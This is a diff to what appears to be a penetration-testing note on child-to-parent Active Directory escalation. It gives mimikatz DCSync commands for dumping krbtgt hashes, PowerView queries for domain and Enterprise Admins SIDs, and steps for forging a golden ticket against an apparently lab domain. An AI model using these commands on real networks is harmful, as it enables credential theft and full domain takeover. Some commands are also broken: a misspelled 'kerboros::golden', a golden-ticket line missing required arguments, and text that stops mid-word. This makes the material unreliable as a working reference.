@@ -19,6 +19,9 @@ The following is needed to carryon this attack:
 mimikatz.exe
 privilege::debug
 lsadump::dcsync /user:<domain>\krbtgt #Mark down the hashes
+#This specific line tell us the FQDN name of the child domain
+[DC] '<domainfqdnname>' will be the domain
+
 ```
 
 -Getting the child domain SID with PowerView:
@@ -31,4 +34,17 @@ Get-DomainSID
 Get-DomainGroup -Domain <parentdomainname> -Identity "Enterprise Admins" | select distinguishedname,objectsid
 ```
 
-We also need to designate a target us
+We also need to designate a target username (does not need to be real), in example we would be using NJohn
+
+We first craft us a golden ticket with mimikatz:
+```
+mimikatz.exe
+privilege::debug
+kerboros::golden /user: NJohn /domain:<parentdomainfqdnname> /sid:<enterpriseadminsid> /
+#Example:
+kerberos::golden /user:NJohn /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /
+```
+
+We then use klist to confirm the existence of the crafted golden ticket in our current session
+
+If the ticket exist, we then have complete control ove
